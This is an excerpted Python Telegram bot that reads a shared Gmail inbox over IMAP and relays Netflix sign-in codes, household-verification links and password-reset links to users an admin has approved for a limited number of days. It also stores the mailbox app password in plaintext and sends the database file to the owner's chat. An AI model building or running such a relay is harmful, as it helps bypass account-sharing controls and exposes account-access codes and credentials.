...
# ─────────────────────────────────────────────────────────────────────────────
# Helpers: safe send/edit with retry, flood control, and “not modified” guard
# ─────────────────────────────────────────────────────────────────────────────
async def safe_send_message(bot, chat_id, text, **kwargs):
    """
    Sends a message with simple rate-limit/backoff handling.
    Retries a few times on RetryAfter and transient network errors.
    """
    max_retries = 3
    attempt = 0
    while True:
        try:
            # small spacing between sends to avoid bursts
            await asyncio.sleep(0.05)
            return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except RetryAfter as e:
            attempt += 1
            if attempt > max_retries:
                logger.warning(f"safe_send_message: exceeded retries for chat {chat_id}")
                raise
            sleep_for = max(1, int(getattr(e, "retry_after", 1)))
            logger.info(f"Rate limited. Sleeping {sleep_for}s (attempt {attempt}/{max_retries})")
            ...
            # For other BadRequests, just re-raise
            raise

async def safe_send_document(bot, chat_id, document, **kwargs):
    """
    Sends a document with simple rate-limit/backoff handling.
    """
    max_retries = 3
    attempt = 0
    while True:
        try:
            ...
            attempt += 1
            if attempt > max_retries:
                logger.warning(f"safe_send_document: exceeded retries for chat {chat_id}")
                raise
            sleep_for = max(1, int(getattr(e, "retry_after", 1)))
            logger.info(f"Rate limited (doc). Sleeping {sleep_for}s (attempt {attempt}/{max_retries})")
            await asyncio.sleep(sleep_for)
        except (TimedOut, NetworkError):
            attempt += 1
            if attempt > max_retries:
...
async def safe_edit_text(message, new_text, **kwargs):
    """
    Edits a message safely. If content+markup are the same, ignore the error.
    """
    try:
        # If the text is identical, Telegram will complain.
        # Compare to best available property. message.text may be None on some content types.
        old_text = message.text or message.caption or ""
        markup = kwargs.get("reply_markup", None)
        # Quick check: if text equals, skip edit to avoid “Message is not modified”.
        if old_text == new_text:
            # However, markup might be different; attempt once and ignore only that specific error.
            try:
...
async def safe_edit_markup(message, reply_markup):
    """
    Edits reply markup only; ignores “Message is not modified”.
    """
    try:
...
# Debounce for db.json owner pushes
_last_db_push_ts = 0
_db_push_lock = threading.Lock()

def can_push_db_to_owner(min_interval_sec=5):
    global _last_db_push_ts
    with _db_push_lock:
        now = datetime.datetime.now().timestamp()
        if now - _last_db_push_ts >= min_interval_sec:
            _last_db_push_ts = now
            return True
        return False
...
def save_db(data):
    ...
    # After any change to db.json, send the updated file to the owner — debounced and safe
    try:
        # Application may not be built yet at import-time; guard it.
        loop = asyncio.get_event_loop()
        if "application" in globals() and getattr(globals().get("application"), "bot", None) and can_push_db_to_owner():
            coro = safe_send_document(
                application.bot,
                OWNER_CHAT_ID,
...
def decrement_days_and_notify():
    try:
        ...
        # Use asyncio-safe sends with soft throttling to avoid bursts
        async def _notify_batch():
            try:
                admin = await application.bot.get_chat(ADMIN_CHAT_ID)
                ...
                for uid in to_notify:
                    ...
                    await safe_send_message(application.bot, uid, "\n".join(lines))
                    ...
                    await safe_send_message(application.bot, ADMIN_CHAT_ID, "\n".join(alert), parse_mode="Markdown")
                    # light pause between users
                    await asyncio.sleep(0.05)
            except Exception:
                tb = traceback.format_exc()
                bio = BytesIO(tb.encode("utf-8"))
                bio.name = "error.txt"
                await safe_send_document(application.bot, OWNER_CHAT_ID, bio, filename="error.txt", caption="Error in scheduled decrement_days_and_notify")

        asyncio.run_coroutine_threadsafe(_notify_batch(), asyncio.get_event_loop())
...
async def report_error(context: ContextTypes.DEFAULT_TYPE, e: Exception):
    try:
        ...
        if not tb or tb == "NoneType: None":
            # Sometimes libraries raise 'NoneType: None' – add context
            tb = f"Reported exception object: {repr(e)}\nTraceback unavailable."
        bio = BytesIO(tb.encode("utf-8"))
        bio.name = "error.txt"
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if chat_id == ADMIN_CHAT_ID:
        ...
        if not mail or not pwd:
            ...
            await safe_send_message(context.bot, update.effective_chat.id, f"Hey {user.full_name}, this bot is not configured yet. Please click below to configure.")
            return ADMIN_EMAIL
        temp = await safe_send_message(context.bot, update.effective_chat.id, "Checking your details...")
        if await test_imap(mail, pwd):
            kb = InlineKeyboardMarkup.from_button(InlineKeyboardButton("Reconfigure", callback_data="cfg_clear"))
            # Safe edit
            await safe_edit_text(temp, f"Hey {user.full_name}, you are the captain\nYou already configured this bot.", reply_markup=kb)
        else:
            initialize_db()
            kb = InlineKeyboardMarkup.from_button(InlineKeyboardButton("Configure this bot", callback_data="cfg_start"))
            await safe_edit_text(temp, f"Hey {user.full_name}, this bot is not configured yet. Please click below to configure.", reply_markup=kb)
            return ADMIN_EMAIL
        return
    ...
    if not usr or usr["days"] <= 0:
        ...
        return await safe_send_message(context.bot, update.effective_chat.id, text)
...
async def fetch_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not buttons:
        return await safe_send_message(context.bot, update.effective_chat.id, "You have no features enabled. Contact your admin.")

    kb = InlineKeyboardMarkup.from_row(buttons)
    await safe_send_message(context.bot, update.effective_chat.id, f"Hey {update.effective_user.full_name}, which Netflix mail would you like to retrieve?", reply_markup=kb)
...
async def request_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if chat.type in (Chat.GROUP, Chat.SUPERGROUP):
        ...
        if grp and grp["days"] > 0:
            return await safe_send_message(context.bot, update.effective_chat.id, "This group is already approved and has access to the bot.")
        # Otherwise, send a fresh group request
        await safe_send_message(context.bot, update.effective_chat.id, "👍 Your group request has been sent to the admin.")
        ...
        await safe_send_message(context.bot, ADMIN_CHAT_ID, msg, parse_mode="Markdown")
        return

    if chat.id == ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "Admins cannot use /request.")
    user = update.effective_user
    data = load_db()
    ...
    if user_rec and user_rec["days"] > 0:
        return await safe_send_message(context.bot, update.effective_chat.id, "You are already approved.")
    await safe_send_message(context.bot, update.effective_chat.id, "Request sent to admin.")
    admin = await context.bot.get_chat(ADMIN_CHAT_ID)
...
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "You are not authorized.")
    try:
        _, target_s = update.message.text.split()
        target_id = int(target_s)
    except:
        return await safe_send_message(context.bot, update.effective_chat.id, "Usage: /status <chat_id>")
    data = load_db()
    usr = next((u for u in data["credentials"][0]["users"] if u["id"] == target_id), None)
    if not usr or usr["days"] <= 0:
        return await safe_send_message(context.bot, update.effective_chat.id, f"User {target_id} is not approved.")
    mails = usr.get("mails", [])
    ...
    await safe_send_message(context.bot, update.effective_chat.id, text, reply_markup=kb)

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "You are not authorized to use /users.")
    data = load_db()
    users = data["credentials"][0]["users"]
    bio = BytesIO(json.dumps(users, indent=2).encode("utf-8"))
    bio.name = "users.json"
    await safe_send_document(context.bot, ADMIN_CHAT_ID, bio, filename="users.json")

async def terminate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "You are not authorized to use /terminate.")
    data = load_db()
    data["credentials"][0]["users"] = []
    save_db(data)
    await safe_send_message(context.bot, update.effective_chat.id, "All users have been disapproved.")

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_send_message(context.bot, update.effective_chat.id, "Contact @NoonXD for support")
...
async def mail_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "Not authorized.")
    data = load_db()
    data["credentials"][0]["mail"] = ""
    data["credentials"][0]["pass"] = ""
    save_db(data)
    await safe_send_message(context.bot, update.effective_chat.id, "IMAP credentials cleared. Please send me your Gmail address to configure the bot.")
    return ADMIN_EMAIL
...
async def reconfigure_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "Not authorized.")
    initialize_db()
    await safe_send_message(context.bot, update.effective_chat.id, "Factory reset complete.\nPlease send me your Gmail address to configure the bot.")
    return ADMIN_EMAIL
...
async def cfg_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await safe_send_message(context.bot, update.effective_chat.id, "Please send me your Gmail address.")
    return ADMIN_EMAIL
...
async def cfg_clear_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    save_db(data)
    await update.callback_query.answer()
    await safe_send_message(context.bot, update.effective_chat.id, "IMAP cleared. Please send me your Gmail address.")
    return ADMIN_EMAIL
...
async def admin_email_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not text.lower().endswith("@gmail.com"):
        await safe_send_message(context.bot, update.effective_chat.id, "That’s not a Gmail address.")
        return ADMIN_EMAIL
    ...
    await safe_send_message(context.bot, update.effective_chat.id, "Now send me your app password.", reply_markup=kb)
    return ADMIN_PASS
...
async def admin_pass_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    temp = await safe_send_message(context.bot, update.effective_chat.id, "Connecting to your IMAP…")
    if not await test_imap(mail, pwd):
        await safe_edit_text(temp, "Failed to connect; please retry.")
        return
    data = load_db()
    ...
    await safe_edit_text(temp, "Successfully connected.")
    await safe_send_message(context.bot, update.effective_chat.id, "All set!", reply_markup=kb)
    return ConversationHandler.END
...
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        return await safe_send_message(context.bot, update.effective_chat.id, "Usage: /approve <chat_id> <days>")
    data = load_db()
    users = data["credentials"][0]["users"]
    usr = next((u for u in users if u["id"] == chat_id), None)
    if usr:
        if usr["days"] > 0:
            return await safe_send_message(context.bot, update.effective_chat.id, f"{chat_id} already approved for {usr['days']} days.")
        usr["days"] = days
    ...
    await safe_send_message(context.bot, update.effective_chat.id, f"Approved {chat_id} for {days} days.", reply_markup=mail_choice_markup)
...
async def handle_set_all_mails_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    usr = next((u for u in data["credentials"][0]["users"] if u["id"] == chat_id), None)
    if not usr:
        return await safe_send_message(context.bot, update.effective_chat.id, "User not found.")
    usr["mails"] = ["ALL"]
    save_db(data)
    markup = build_access_markup(chat_id)
    await safe_send_message(context.bot, update.effective_chat.id, f"Approved {chat_id} for {usr['days']} days for all mails.", reply_markup=markup)
...
async def extend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        return await safe_send_message(context.bot, update.effective_chat.id, "Usage: /extend <chat_id> <days>")
    data = load_db()
    usr = next((u for u in data["credentials"][0]["users"] if u["id"] == chat_id), None)
    if not usr:
        return await safe_send_message(context.bot, update.effective_chat.id, f"{chat_id} is not approved.")
    usr["days"] += days
    usr.setdefault("mails", [])
    save_db(data)
    markup = build_access_markup(chat_id)
    await safe_send_message(context.bot, update.effective_chat.id, f"Extended {chat_id}: now {usr['days']} days left.\nThis user has access to:", reply_markup=markup)
...
async def disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        return await safe_send_message(context.bot, update.effective_chat.id, "Usage: /disapprove <chat_id>")
    data = load_db()
    ...
    save_db(data)
    await safe_send_message(context.bot, update.effective_chat.id, f"Removed approval for {chat_id}.")
...
async def toggle_feature_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if action == "disapprove_cb":
        ...
        save_db(data)
        # Replace edit_text with a safe send (some clients can't edit old markup/text)
        return await safe_send_message(context.bot, update.effective_chat.id, f"User {chat_id} disapproved.")
    if not usr:
    ...
    save_db(data)
    markup = build_access_markup(chat_id)
    # Use safe_edit_text to avoid “Message is not modified”
    await safe_edit_text(update.callback_query.message, f"Access settings for {chat_id}:", reply_markup=markup)

async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        return await safe_send_message(context.bot, update.effective_chat.id, "You are not authorized.")
    if not context.args:
        return await safe_send_message(context.bot, update.effective_chat.id, "Usage: /info <email>")
    ...
    if not linked:
        return await safe_send_message(context.bot, update.effective_chat.id, f"{email_arg} is not linked to any user.")
...
async def handle_unlink_all_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if changed:
        save_db(data)
        await safe_send_message(context.bot, ADMIN_CHAT_ID, f"✅ Unlinked {email_arg} from all users.")
    else:
        await safe_send_message(context.bot, ADMIN_CHAT_ID, f"ℹ️ No user had {email_arg} linked.")

async def handle_info_go_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await safe_send_message(context.bot, ADMIN_CHAT_ID, "Cancelled.")
...
async def cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await safe_send_message(context.bot, ADMIN_CHAT_ID, "Operation cancelled.")
...
async def unlink_mail_user_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await safe_send_message(context.bot, update.effective_chat.id, "Send the mails to unlink (one per line):")

async def link_mail_user_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    _, chat_id_str = update.callback_query.data.split(":", 1)
    context.user_data["link_for"] = int(chat_id_str)
    await safe_send_message(context.bot, update.effective_chat.id, "Send the mails to link (one per line):")
...
async def handle_fh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await safe_edit_text(update.callback_query.message, f"Okay {update.effective_user.full_name}, send me your Netflix email to retrieve household mail.", reply_markup=kb)
...
async def handle_fs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.callback_query.answer()
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("Go Back ⏎", callback_data="go_back")]])
    await safe_edit_text(update.callback_query.message, f"Okay {update.effective_user.full_name}, send me your Netflix email to retrieve sign-in code.", reply_markup=kb)
...
async def handle_fr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.callback_query.answer()
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("Go Back ⏎", callback_data="go_back")]])
    # FIX: use safe_edit_text to avoid “Message is not modified”
    await safe_edit_text(update.callback_query.message, f"Okay {update.effective_user.full_name}, send me your Netflix email to retrieve password reset link.", reply_markup=kb)
...
async def handle_go_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if usr.get("reset"):
        buttons.append(InlineKeyboardButton("Password Reset 🛡️", callback_data="fr"))
    if not buttons:
        await safe_edit_text(update.callback_query.message, f"Hey {update.effective_user.full_name}, you have no features enabled.")
        context.user_data.pop(F_FLOW_FLAG, None)
        return
    kb = InlineKeyboardMarkup.from_row(buttons)
    await safe_edit_text(update.callback_query.message, f"Hey {update.effective_user.full_name}, which Netflix mail would you like to retrieve?", reply_markup=kb)
    context.user_data.pop(F_FLOW_FLAG, None)
...
async def handle_flow_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not flow:
        return await safe_send_message(context.bot, update.effective_chat.id, "Unrecognized message. To retrieve Netflix mail, send /fetch")

    email_addr = update.message.text.strip()
    if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email_addr):
        return await safe_send_message(context.bot, update.effective_chat.id, "Please send a valid email address, or send /fetch to start over.")
    ...
    try:
        ...
        if not uids_hour:
            return await safe_edit_text(temp, f"No Netflix emails in the last hour for {email_addr}.")
        uids_15m = await loop.run_in_executor(None, lambda: _filter_uids_last_15m(imap_conn, uids_hour))
        if not uids_15m:
            return await safe_edit_text(temp, f"No Netflix emails in the last 15 minutes for {email_addr}.")
        ...
        if flow == "fh":
            ...
            if not links:
                await safe_edit_text(temp, "No household links found in the last 15 minutes.")
            else:
                for link in links:
                    await safe_send_message(
                        context.bot,
            ...
            if not codes:
                await safe_edit_text(temp, "No sign-in codes found in the last 15 minutes.")
            else:
                for code in codes:
                    await safe_send_message(
                        context.bot,
                        update.effective_chat.id,
                        f"📧 Received from: info@account.netflix.com\n"
                        f"➤ Received to: <code>{email_addr}</code>\n"
                        f"🔑 Sign-in code: <code>{code}</code>",
                        parse_mode="HTML"
                    )
                try:
                    await temp.delete()
            ...
            links = [l for l in results.values() if l]
            if not links:
                await safe_edit_text(temp, "No password reset links found in the last 15 minutes.")
            else:
                for link in links:
                    await safe_send_message(
                        context.bot,
        ...
        logger.error(f"Error during IMAP fetch: {e}", exc_info=True)
        await safe_send_message(context.bot, update.effective_chat.id, "Error occurred while fetching emails.")
    finally:
        if imap_conn:
            try:
    ...
    await safe_send_message(context.bot, ADMIN_CHAT_ID, alert_text, parse_mode="Markdown", reply_markup=kb)
...
async def handle_admin_mail_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if MAIL_FLOW_FLAG in context.user_data:
        ...
        for l in lines:
            if email_re.match(l):
                ...
                invalid.append(l)
        if not valid:
            return await safe_send_message(context.bot, update.effective_chat.id, "No valid email addresses detected. Please send valid emails one per line.")
        data = load_db()
        usr = next((u for u in data["credentials"][0]["users"] if u["id"] == chat_id), None)
        if not usr:
            return await safe_send_message(context.bot, update.effective_chat.id, "User not found.")
        ...
        return await safe_send_message(context.bot, update.effective_chat.id, msg, reply_markup=markup)
    if "unlink_for" in context.user_data:
        ...
        for mail in lines:
            if usr and mail in usr.get("mails", []):
                ...
                skipped.append(mail)
        save_db(data)
        return await safe_send_message(context.bot, update.effective_chat.id, f"Unlinked: {removed}\nSkipped: {skipped}")
    if "link_for" in context.user_data:
        ...
        return await safe_send_message(context.bot, update.effective_chat.id, msg)
...
async def broadcast_from_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # Send sequentially with soft delay + retry to respect Telegram’s flood limits
    sent = 0
    try:
        if not has_media:
            for uid in user_ids:
            ...
            if msg.photo:
                ...
                return await safe_send_message(context.bot, update.effective_chat.id, "❌ Unsupported media type for broadcast.")

        await safe_send_message(context.bot, update.effective_chat.id, f"✅ Successfully sent to {sent} users.")
    except Exception:
        tb = traceback.format_exc()
        bio = BytesIO(tb.encode("utf-8"))
...
if __name__ == "__main__":
    ...
    # Start the scheduler now that application exists
    try:
        scheduler.start()
    except Exception as e:
